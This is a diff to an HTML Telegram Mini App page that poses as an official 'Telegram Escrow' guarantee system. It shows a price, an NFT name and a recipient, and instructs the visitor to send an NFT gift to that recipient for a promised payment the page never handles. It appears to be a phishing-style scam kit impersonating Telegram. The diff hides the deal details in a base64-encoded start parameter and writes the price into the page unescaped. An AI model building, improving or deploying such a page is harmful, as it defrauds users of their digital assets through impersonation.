@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<title>Telegram — Сделка</title>
+<title>Telegram</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
   :root{
@@ -19,7 +19,7 @@
   html,body{margin:0;padding:0;background:var(--tg-bg);color:var(--tg-text);
     font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Segoe UI",Roboto,sans-serif;
     font-size:15px;line-height:1.4}
-  .wrap{padding:16px}
+  .wrap{padding:16px;max-width:520px;margin:0 auto}
   .bubble{
     background:var(--tg-secondary);
     border-radius:18px;
@@ -29,14 +29,16 @@
   }
   .bubble .head{
     display:flex;align-items:center;gap:8px;
-    font-size:13px;color:var(--tg-hint);margin-bottom:8px;
+    font-size:13px;color:var(--tg-hint);margin-bottom:10px;
   }
   .bubble .head b{color:var(--tg-text)}
   .amount{
-    font-size:22px;font-weight:700;margin:6px 0;
+    font-size:24px;font-weight:700;margin:4px 0 10px;
+    display:flex;align-items:center;gap:6px;
   }
-  .amount .curr{font-weight:500;color:var(--tg-hint);font-size:15px;margin-left:4px}
-  .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.06)}
+  .amount .curr{font-weight:500;color:var(--tg-hint);font-size:15px;margin-left:2px}
+  .row{display:flex;justify-content:space-between;padding:9px 0;
+    border-bottom:1px solid rgba(255,255,255,.06)}
   .row:last-child{border-bottom:none}
   .row .k{color:var(--tg-hint)}
   .row .v{font-weight:600;max-width:60%;text-align:right;word-break:break-all}
@@ -46,6 +48,7 @@
     background:var(--tg-button);color:var(--tg-button-text);
     font-size:16px;font-weight:600;cursor:pointer;
     margin-top:8px;text-decoration:none;
+    font-family:inherit;
   }
   .btn.secondary{
     background:var(--tg-secondary);color:var(--tg-text);
@@ -58,53 +61,59 @@
     font-size:13px;line-height:1.45;
   }
   .warn b{color:#ffd07a}
-  .tg-emoji{vertical-align:-2px}
+  ol{margin:0;padding-left:20px}
+  ol li{padding:3px 0}
   .footer{color:var(--tg-hint);font-size:12px;text-align:center;margin:18px 0 4px}
+  .loading{color:var(--tg-hint);text-align:center;padding:40px 0}
 </style>
 </head>
 <body>
-<div class="wrap">
+<div class="wrap" id="root">
+  <div class="loading" id="loading">Загрузка сделки…</div>
 
-  <div class="bubble">
-    <div class="head">
-      <tg-emoji emoji-id="6028346797368283073">✈️</tg-emoji>
-      <b>Telegram</b> · <span>Гарантийная система</span>
+  <div id="content" style="display:none">
+
+    <div class="bubble">
+      <div class="head">
+        <tg-emoji emoji-id="6028346797368283073">✈️</tg-emoji>
+        <b>Telegram</b> · <span>Гарантийная система</span>
+      </div>
+      <div class="amount" id="amount">—</div>
+      <div class="row"><span class="k">Ордер</span><span class="v" id="order">—</span></div>
+      <div class="row"><span class="k">NFT</span><span class="v" id="nft">—</span></div>
+      <div class="row"><span class="k">Получатель</span><span class="v" id="receiver">—</span></div>
+      <div class="row"><span class="k">Статус</span><span class="v">Ожидает передачи</span></div>
     </div>
-    <div class="amount" id="amount">—</div>
-    <div class="row"><span class="k">Ордер</span><span class="v" id="order">—</span></div>
-    <div class="row"><span class="k">NFT</span><span class="v" id="nft">—</span></div>
-    <div class="row"><span class="k">Получатель</span><span class="v" id="receiver">—</span></div>
-    <div class="row"><span class="k">Статус</span><span class="v">Ожидает передачи</span></div>
-  </div>
 
-  <div class="bubble">
-    <div class="head">
-      <tg-emoji emoji-id="6030848053177486888">❗️</tg-emoji>
-      <b>Инструкция</b>
+    <div class="bubble">
+      <div class="head">
+        <tg-emoji emoji-id="6030848053177486888">❗️</tg-emoji>
+        <b>Инструкция</b>
+      </div>
+      <ol>
+        <li>Откройте чат с получателем</li>
+        <li>Передайте подарок <b id="nft2">—</b></li>
+        <li>Вернитесь сюда и нажмите «Подтвердить»</li>
+      </ol>
     </div>
-    <ol style="margin:0;padding-left:20px">
-      <li>Откройте чат с получателем</li>
-      <li>Передайте подарок <b id="nft2">—</b></li>
-      <li>Вернитесь сюда и нажмите «Подтвердить»</li>
-    </ol>
+
+    <a class="btn" id="openChat">
+      <tg-emoji emoji-id="6039391078136681499">🔗</tg-emoji>
+      Открыть чат с получателем
+    </a>
+
+    <button class="btn secondary" id="confirmBtn">
+      <tg-emoji emoji-id="5774077015388852135">✅</tg-emoji>
+      Подтвердить передачу
+    </button>
+
+    <div class="warn">
+      <tg-emoji emoji-id="6030537007350944596">🛡</tg-emoji>
+      <div><b>Внимание.</b> Если подарок уйдёт другому пользователю — сделка аннулируется, оплата не поступит, а подарок будет утерян безвозвратно.</div>
+    </div>
+
+    <div class="footer">Защищено системой Telegram · Escrow</div>
   </div>
-
-  <a class="btn" id="openChat">
-    <tg-emoji emoji-id="6039391078136681499">🔗</tg-emoji>
-    Открыть чат с получателем
-  </a>
-
-  <button class="btn secondary" id="confirmBtn">
-    <tg-emoji emoji-id="5774077015388852135">✅</tg-emoji>
-    Подтвердить передачу
-  </button>
-
-  <div class="warn">
-    <tg-emoji emoji-id="6030537007350944596">🛡</tg-emoji>
-    <div><b>Внимание.</b> Если подарок уйдёт другому пользователю — сделка аннулируется, оплата не поступит, а подарок будет утерян безвозвратно.</div>
-  </div>
-
-  <div class="footer">Защищено системой Telegram · Escrow</div>
 </div>
 
 <script>
@@ -112,28 +121,56 @@
   tg?.ready();
   tg?.expand();
 
-  const q = new URLSearchParams(location.search);
-  const price = q.get("price") || "—";
-  const currency = (q.get("currency") || "stars").toLowerCase();
-  const nftName = q.get("nft_name") || "NFT";
-  const receiver = q.get("receiver") || "";
-  const order = q.get("order") || "";
+  // base64url → utf-8 строка
+  function b64decode(s) {
+    s = s.replace(/-/g, "+").replace(/_/g, "/");
+    while (s.length % 4) s += "=";
+    const bin = atob(s);
+    const bytes = new Uint8Array(bin.length);
+    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+    return new TextDecoder("utf-8").decode(bytes);
+  }
 
-  const currLabel = currency === "stars" ? "⭐️ Stars" : "Gram";
+  const startParam =
+    tg?.initDataUnsafe?.start_param ||
+    new URLSearchParams(location.search).get("startapp") ||
+    "";
 
-  document.getElementById("amount").innerHTML =
-    `<tg-emoji emoji-id="6037175527846975726">⭐️</tg-emoji> ${price}<span class="curr">${currLabel}</span>`;
-  document.getElementById("order").textContent = "#TG-" + order;
-  document.getElementById("nft").textContent = nftName;
-  document.getElementById("nft2").textContent = nftName;
-  document.getElementById("receiver").textContent = "@" + receiver;
+  function showError(msg) {
+    document.getElementById("loading").textContent = msg;
+  }
 
-  document.getElementById("openChat").href = "https://t.me/" + receiver;
+  function render(d) {
+    const currLabel = d.c === "stars" ? "⭐️ Stars" : "Gram";
+    document.getElementById("amount").innerHTML =
+      '<tg-emoji emoji-id="6037175527846975726">⭐️</tg-emoji> ' +
+      d.p +
+      '<span class="curr">' + currLabel + '</span>';
+    document.getElementById("order").textContent = "#TG-" + d.o;
+    document.getElementById("nft").textContent = d.n;
+    document.getElementById("nft2").textContent = d.n;
+    document.getElementById("receiver").textContent = "@" + d.r;
+    document.getElementById("openChat").href = "https://t.me/" + d.r;
+
+    document.getElementById("loading").style.display = "none";
+    document.getElementById("content").style.display = "block";
+  }
+
+  if (!startParam) {
+    showError("Сделка не найдена.");
+  } else {
+    try {
+      const data = JSON.parse(b64decode(startParam));
+      render(data);
+    } catch (e) {
+      showError("Сделка не найдена или повреждена.");
+    }
+  }
 
   document.getElementById("confirmBtn").addEventListener("click", () => {
     tg?.showAlert(
       "Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.",
-      () => { tg?.close(); }
+      () => { /* можно закрыть webapp: tg?.close(); */ }
     );
   });
 </script>
